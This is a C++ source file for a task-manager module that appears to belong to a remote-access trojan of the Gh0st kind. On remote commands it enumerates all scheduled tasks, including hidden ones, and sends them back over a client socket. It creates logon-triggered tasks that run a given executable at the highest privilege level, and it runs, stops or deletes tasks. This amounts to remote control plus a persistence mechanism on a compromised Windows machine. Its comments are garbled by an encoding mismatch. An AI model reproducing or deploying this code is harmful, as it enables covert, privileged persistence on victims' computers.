#include "TaskManager.h"
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#include <comdef.h>


CTaskManager::CTaskManager(CClientSocket* pClient) : CManager(pClient)
{
   
    //��ʼ��com��
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    if (FAILED(hr))
    {
        pClient->Disconnect();
    }
    // ���ð�ȫ�ȼ�
    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);

    if (FAILED(hr))
    {
        pClient->Disconnect();
    }
     //ʵ�����ƻ�����
    hr = CoCreateInstance(CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&pService);

    if (FAILED(hr))
    {
        pClient->Disconnect();
    }

    //  ���Ӽƻ�����
    hr = pService->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());

    if (FAILED(hr))
    {
        pClient->Disconnect();
    }

    GetRoot();
}

CTaskManager::~CTaskManager()
{
    
    //�ͷ����ӵ�
    pService->Release();
    //ж��com��Դ
    CoUninitialize();
   
}

void CTaskManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
    
    switch (lpBuffer[0])
    {
        case COMMAND_TASKLIST:          //��ȡ����
            GetRoot();
            break;
        case COMMAND_TASKCREAT:          //��������
            CreateTask(lpBuffer+1);
            break;
        case COMMAND_TASKDEL:          //ɾ������
            DelTask(lpBuffer + 1);
            break;
        case COMMAND_TASKSTOP:          //ֹͣ����
            RunOrStopTask(lpBuffer + 1,0);
            break;
        case COMMAND_TASKSTART:          //��ʼ����
            RunOrStopTask(lpBuffer + 1,1);
            break;
        default:
            break;
    }
}

void CTaskManager::SaveData(BSTR taskname, BSTR path, BSTR exepath,char* status, DATE LastTime, DATE NextTime)
{
    DWORD nameLEN = 0;
    DWORD taskpathLEN = 0;
    DWORD statusLEN = 0;
    DWORD exeLEN = 0;
    DWORD sum = 0;
    char name[MAX_PATH] = { 0 };
    char taskpath[MAX_PATH] = { 0 };
    char exe[MAX_PATH] = { 0 };
    if (taskname)
        WideCharToMultiByte(CP_ACP, 0, taskname,-1, name, MAX_PATH,0,0);
    if (path)
        WideCharToMultiByte(CP_ACP, 0, path, -1, taskpath, MAX_PATH, 0, 0);
    if (exepath)
        WideCharToMultiByte(CP_ACP, 0, exepath, -1, exe, MAX_PATH, 0, 0);


    nameLEN = strlen(name) + 1;
    taskpathLEN = strlen(taskpath) + 1;
    statusLEN = strlen(status) + 1;
    exeLEN = strlen(exe) + 1;

    sum = nameLEN + taskpathLEN + statusLEN  + exeLEN  + sizeof(DATE) * 2;
    // ��̬��չ������
    if (nBufferSize  < (offset  + sum))
    {
        nBufferSize = nBufferSize + 1024*4;
        lpList = (BYTE*)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT | LMEM_MOVEABLE);
        if (!lpList)
        {
            return;
        }
    }

    //��������
    memcpy(lpList + offset, name, nameLEN );
    offset += nameLEN ;

    memcpy(lpList + offset, taskpath, taskpathLEN);
    offset += taskpathLEN ;

    memcpy(lpList + offset, exe, exeLEN);
    offset += exeLEN;

    memcpy(lpList + offset, status, statusLEN );
    offset += statusLEN;

    memcpy(lpList + offset, &LastTime, sizeof(DATE));
    offset += sizeof(DATE);

    memcpy(lpList + offset, &NextTime, sizeof(DATE));
    offset += sizeof(DATE);
}


BOOL CTaskManager::GetProgramPath(ITaskDefinition* iDefinition, BSTR* exepath)
{
    IActionCollection* pIAction = NULL;
    IAction* pAction = NULL;
    IExecAction* pExecAction = NULL;
   HRESULT hr =  iDefinition->get_Actions(&pIAction);
    if (FAILED(hr))
    {
        goto out;
    }

    hr =  pIAction->get_Item(1, &pAction);
    if (FAILED(hr))
    {
        goto out;
    }

    hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
     if (FAILED(hr))
     {
         goto out;
     }

     pExecAction->get_Path(exepath);

out:
    if (pIAction)
        pIAction->Release();
    if (pAction)
        pAction->Release();
    if (pExecAction)
        pExecAction->Release();

    iDefinition->Release();
    return 1;
}

PBYTE CTaskManager::GetTaskAll(ITaskFolder* pFolder)
{
    IRegisteredTaskCollection* pTaskCollection = NULL;   //�������񼯺�
    LONG numTasks = 0;                                                  //�������

    //��ȡ��������
    HRESULT hr = pFolder->GetTasks(TASK_ENUM_HIDDEN, &pTaskCollection);
    pFolder->Release();

    if (FAILED(hr))
    {
        return NULL;
    }

    //��ȡ�������
    hr = pTaskCollection->get_Count(&numTasks);
    if (numTasks == 0)
    {
        pTaskCollection->Release();
        return NULL;
    }

    
    //��ʼ��������
    for (LONG i = 0; i < numTasks; i++)
    {
        IRegisteredTask* pRegisteredTask = NULL;
        hr = pTaskCollection->get_Item(_variant_t(i + 1), &pRegisteredTask);            //�±��Ǵ�1��ʼ��
        if (SUCCEEDED(hr))
        {
            ITaskDefinition* pDefinition = NULL;
            BSTR taskName = NULL;
            BSTR path = NULL;
            BSTR exepath = NULL;
            DATE LastTime = 0;                                 
            DATE NextTime = 0;
            char* status = NULL;
            TASK_STATE taskState = TASK_STATE_UNKNOWN;

            pRegisteredTask->get_Name(&taskName);
            pRegisteredTask->get_Path(&path);   
            pRegisteredTask->get_LastRunTime(&LastTime);
            pRegisteredTask->get_NextRunTime(&NextTime);
            pRegisteredTask->get_State(&taskState);

            pRegisteredTask->get_Definition(&pDefinition);
            if (pDefinition)
            {
                GetProgramPath(pDefinition,&exepath);
            }

            switch (taskState)
            {
                case TASK_STATE_UNKNOWN:
                    status = "δ֪״̬";
                    break;
                case TASK_STATE_DISABLED:
                    status = "�ѽ���";
                    break;
                case TASK_STATE_QUEUED:
                    status = "�Ŷ���";
                    break;
                case TASK_STATE_READY:
                    status = "��׼��";
                    break;
                case TASK_STATE_RUNNING:
                    status = "������";
                    break;
                default:
                    break;
            }
            //�������ݵ�buff��
            SaveData(taskName, path, exepath, status,LastTime, NextTime);

            if (path)
                SysFreeString(path);
            if (taskName)
                SysFreeString(taskName);
            if (exepath)
                SysFreeString(exepath);
            if (pRegisteredTask)
                pRegisteredTask->Release();
        }
    }
    pTaskCollection->Release();
    return NULL;
}

PBYTE CTaskManager::GetFolderAll(ITaskFolder* pFolder)
{
    ITaskFolderCollection* pFolders = NULL;         //���ļ��м���
    LONG Count = 0;                                             //���ļ��и���

    HRESULT hr = pFolder->GetFolders(0, &pFolders);
    if (FAILED(hr))
    {
        return 0;
    }

    //��ȡ�ļ��и���
    hr = pFolders->get_Count(&Count);
    if (FAILED(hr))
    {
        return 0;
    }

    if (Count == 0)
    {
        pFolders->Release();
        //��ȡ�ļ����µ�����
        GetTaskAll(pFolder);
    }
    else
    {
        //�ȱ���Ŀ¼�µ�����
        GetTaskAll(pFolder);

        //�ݹ�����ļ���
        for (size_t i = 0; i < Count; i++)
        {
            ITaskFolder* ispFolder = NULL;
            hr = pFolders->get_Item(variant_t(i + 1), &ispFolder);
            if (FAILED(hr))
            {
                continue;
            }
            GetFolderAll(ispFolder);
        }

        pFolders->Release();
    }

    return 0;
}

PBYTE CTaskManager::GetRoot()
{

    ITaskFolder* pRootFolder = NULL;
    HRESULT hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr))
    {
        return 0;
    }
    //�ȷ�10kb ��С
    nBufferSize = 1024 * 10; // �ȷ���10K�Ļ�����
    lpList = (BYTE*)LocalAlloc(LPTR, nBufferSize);
    
    if (lpList)
    {
        lpList[0] = TOKEN_TASKLIST;
        offset++;
        GetFolderAll(pRootFolder);
        Send((LPBYTE)lpList, LocalSize(lpList));
        LocalFree(lpList);
        lpList = NULL;
        offset = 0;
    }
    else
    {
        pRootFolder->Release();
    }


    return 0;
   
}

//����
BOOL CTaskManager::CreateTask(LPBYTE lpBuffer)
{
    char* rootpath = (char* )lpBuffer;
    char* taskname = rootpath + strlen(rootpath) + 1;
    char* path =taskname +  strlen(taskname) + 1;
    char* Author = path + strlen(path) + 1;
    char* Description = Author + strlen(Author) + 1;

    BOOL ret = FALSE;
    ITaskFolder* pRootFolder = NULL;
    ITaskDefinition* pDefinition = NULL;
    IRegistrationInfo* pRegistrationInfo = NULL;
    IPrincipal* pPrincipal = NULL;
    ITaskSettings* pSettings = NULL;
    ITriggerCollection* pTriggers = NULL;
    IActionCollection* pActions = NULL;
    IExecAction* pExecAction = NULL;
    IRegisteredTask* pRegisteredTask = NULL;

    //ѡ��ƻ�����ע�����ĸ��ļ�����
    HRESULT hr =  pService->GetFolder(_bstr_t(rootpath), &pRootFolder);
    if (SUCCEEDED(hr))
    {
        //�������������
        hr = pService->NewTask(0,&pDefinition);
        if (SUCCEEDED(hr))
        {
            //��ȡע����Ϣ��ʵ��������дע����Ϣ
            hr = pDefinition->get_RegistrationInfo(&pRegistrationInfo);
            //��ȡ����������Ϣ��ʵ��
            HRESULT hr2 = pDefinition->get_Principal(&pPrincipal);
            //�������������Ϣ
            HRESULT hr3 = pDefinition->get_Settings(&pSettings);
            //���ô�����
            HRESULT hr4 = pDefinition->get_Triggers(&pTriggers);
            //����ִ�в���
            HRESULT hr5 = pDefinition->get_Actions(&pActions);

            if (SUCCEEDED(hr) && SUCCEEDED(hr2) && SUCCEEDED(hr3) && SUCCEEDED(hr4) && SUCCEEDED(hr5))
            {
                 //����
                 pRegistrationInfo->put_Author(_bstr_t(Author));
                 //����
                 pRegistrationInfo->put_Description(_bstr_t(Description));
                  //  ���õ�½���� (�û������Ѿ���¼�� �����񽫽������еĽ���ʽ�Ự�����С� )
                  pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
                    // ��������Ȩ�� (���������Ȩ�����С� )
                  pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
                  //���ñ��������Զ��ӳ�10��������
                  pSettings->put_StartWhenAvailable(VARIANT_TRUE);
                  //����������
                  ITrigger* pTrigger;
                  hr = pTriggers->Create(TASK_TRIGGER_LOGON, &pTrigger);

                  IAction* pAction;
                  //����ִ��
                  pActions->Create(TASK_ACTION_EXEC, &pAction);
                  pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                  //���ó���·������Ϣ
                  pExecAction->put_Path(_bstr_t(path));
                  //ע��
                  hr = pRootFolder->RegisterTaskDefinition(_bstr_t(taskname), pDefinition, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &pRegisteredTask);
                  if(SUCCEEDED(hr))
                  {
                      ret = TRUE;
                     
                      pRegisteredTask->Release();
               
                  }

                  if (pAction)
                      pAction->Release();

                  if (pTrigger)
                      pTrigger->Release();
            }
            if (pPrincipal)
                pPrincipal->Release();

            if (pSettings)
                pSettings->Release();

            if (pTriggers)
                pTriggers->Release();

            if (pActions)
                pActions->Release();
            pDefinition->Release();

        }
        pRootFolder->Release();
    }  

    if (ret)
    {
        GetRoot();
    }
    return ret;
}
//ִ�� �� ֹͣ
BOOL CTaskManager::RunOrStopTask(LPBYTE lpBuffer,BOOL Action)
{
    char* rootpath = (char*)lpBuffer;
    char* taskname = rootpath + strlen(rootpath) + 1;


    BOOL ret = FALSE;
    ITaskFolder* pRootFolder = NULL;
    IRegisteredTask* ppTask = NULL;
    VARIANT params = {0};
    //ѡ��ƻ�����ע�����ĸ��ļ�����
    HRESULT hr = pService->GetFolder(_bstr_t(rootpath), &pRootFolder);
    if (SUCCEEDED(hr))
    {
        hr = pRootFolder->GetTask(_bstr_t(taskname),&ppTask);
        if (SUCCEEDED(hr))
        {
            if (Action)  //ִ��
            {
                hr = ppTask->Run(params, NULL);
                if (SUCCEEDED(hr))
                {
                    ret = TRUE;

                }
            }
            else  //ֹͣ
            {
                hr = ppTask->Stop(0);
                if (SUCCEEDED(hr))
                {
                    ret = TRUE;
                }
            }
            ppTask->Release();
        }
        pRootFolder->Release();
    }

    if (ret)
    {
        GetRoot();
    }
    return ret;
}

//ɾ��
BOOL CTaskManager::DelTask(LPBYTE lpBuffer)
{


    char* rootpath = (char*)lpBuffer;
    char* taskname = rootpath + strlen(rootpath) + 1;

    BOOL ret = FALSE;
    ITaskFolder* pRootFolder = NULL;
    //ѡ��ƻ�����ע�����ĸ��ļ�����
    HRESULT hr = pService->GetFolder(_bstr_t(rootpath), &pRootFolder);
    if (SUCCEEDED(hr))
    {
        hr = pRootFolder->DeleteTask(_bstr_t(taskname),0);
        if (SUCCEEDED(hr))
        {
            ret = TRUE;
        }
        pRootFolder->Release();
    }

    if (ret)
    {
        GetRoot();
    }
    return ret;
}

